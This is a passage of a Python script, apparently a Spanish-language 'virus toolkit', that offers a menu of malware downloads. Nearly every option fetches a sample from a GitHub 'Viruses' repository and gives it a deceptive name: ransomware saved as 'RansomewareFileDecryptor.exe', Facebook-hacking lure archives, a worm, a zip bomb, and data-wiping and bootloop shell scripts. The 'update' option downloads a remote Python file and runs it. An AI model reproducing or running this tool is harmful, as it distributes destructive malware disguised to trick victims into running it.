			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/capslock.vbs?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'capslock.vbs?raw=true' Windows/Capslock.vbs")
			print(fun)#####done
			
		elif menu3 == 8:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/alay.vbs?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'alay.vbs?raw=true' Windows/Alay.vbs")
			print(fun)#####done
			
		elif menu3 == 9:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ransomeware.exe?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ransomeware.exe?raw=true' Windows/RansomewareFileDecryptor.exe")
			print(fun)#####done
			
		elif menu3 == 10:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/RIP.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'RIP.bat?raw=true' Windows/RIP.bat")
			print(fun)#####done
		elif menu3 == 11:
			print("\n")
			menu()
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
		
#######################Done  PC

####################start PDF
def Vpdfautorunpc():
	print(""+GR+"["+R+"1"+GR+"] How to hack facebook (ext: rar)")
	print(""+GR+"["+R+"2"+GR+"] Hack facebook        (ext: rar)")
	print(""+GR+"["+R+"3"+GR+"] Back")
	
	try:
		menu4 = input("Input Number >"+R+" ")
		if menu4 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/howtohackfb.rar?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'howtohackfb.rar?raw=true' Pdf-autorun-windows/How-to-hack-facebook.rar")
			print(fun)#####done
			print("password: cracker\n")
		elif menu4 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/hackfacebook.rar?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'hackfacebook.rar?raw=true' Pdf-autorun-windows/Hack-facebook.rar")
			print(fun)#####done
			print("password: cracker\n")
		elif menu4 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong number")
	except NameError:
		print(""+R+"[!] This is not number")
	except Exception as err:
		print(""+R+"[!] This is not number")
		
######################Done pdf

############Worm and Bomb zip
def Vother():
	print(""+GR+"["+R+"1"+GR+"] Worm.bat")
	print(""+GR+"["+R+"2"+GR+"] Bomb.zip")
	print(""+GR+"["+R+"3"+GR+"] Back")
	
	try:
		menu5 = input("Input number > "+R+"")
		if menu5 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/worm.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'worm.bat?raw=true' Worm-and-Bombzip/worm.bat")
			print(fun)#####done
		
		elif menu5 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bom-zip.zip?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'bom-zip.zip?raw=true' Worm-and-Bombzip/Bomb.zip")
			print(fun)#####done
		
		elif menu5 == 3:
			print("\n")
			menu()	
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
		
###############Start Shell Virus		
def Shellvirus():
	print(""+GR+"["+R+"1"+GR+"] Data-Eater.sh")
	print(""+GR+"["+R+"2"+GR+"] Bootloop.sh")
	print(""+GR+"["+R+"3"+GR+"] Back")
	
	try:
		menu6 = input("Input number > "+R+"")
		if menu6 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'data-eater.sh?raw=true' Shell-virus/Data-Eater.sh")
			print(fun)#####done
			
		elif menu6 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'bootloop.sh?raw=true' Shell-virus/Bootloop.sh")
			print(fun)#####done
		elif menu6 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
		
def banner2():
	print(""+B+"Luzius Proyec "+R+"  "+R+"No soy responsable del mal uso de esta herremienta ")
	print(""+R+"[!] "+G+"By Carlober "+R+"[!]"+GR+"")
def menu():
	print("\n"+R+"[<<<<<<<<<<< Menu >>>>>>>>>>]"+GR+"")
	print(""+GR+"["+R+"1"+GR+"] Android\t\t["+R+"4"+GR+"] PDf Autorun PC\t\t["+R+"7"+GR+"] Actulizar Herramienta")
	print(""+GR+"["+R+"2"+GR+"] Macosx\t\t["+R+"5"+GR+"] Otros\t\t\t["+R+"8"+GR+"] About")
	print(""+GR+"["+R+"3"+GR+"] Windows\t\t["+R+"6"+GR+"] Shell\t\t\t["+R+"9"+GR+"] Exit")
	try:
		menu = input("\nInput Number > "+R+"")
		if menu == 1:
			os.system("clear")
			Vandroid()
		elif menu == 2:
			os.system("clear")
			Vmacosx()
		elif menu == 3:
			os.system("clear")
			vpcwin()
		elif menu == 4:
			os.system("clear")
			Vpdfautorunpc()
		elif menu == 5:
			os.system("clear")
			Vother()
		elif menu == 6:
			os.system("clear")
			Shellvirus()
		elif menu == 7:
			os.system("clear")
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Hider5/Malicious/blob/master/malicious.py?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'malicious.py?raw=true' luzius-carlober.py")
			os.system("python2 luzius-carlober.py")
		elif menu == 8:
			os.system("clear")
			about()
		elif menu == 9:
			fontcolor()
			os.system("clear")
			sys.exit()
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
	
if __name__ == "__main__":

	os.system("clear")
	banner()
	banner2()
	menu()
	fontcolor()
	sys.exit()
		


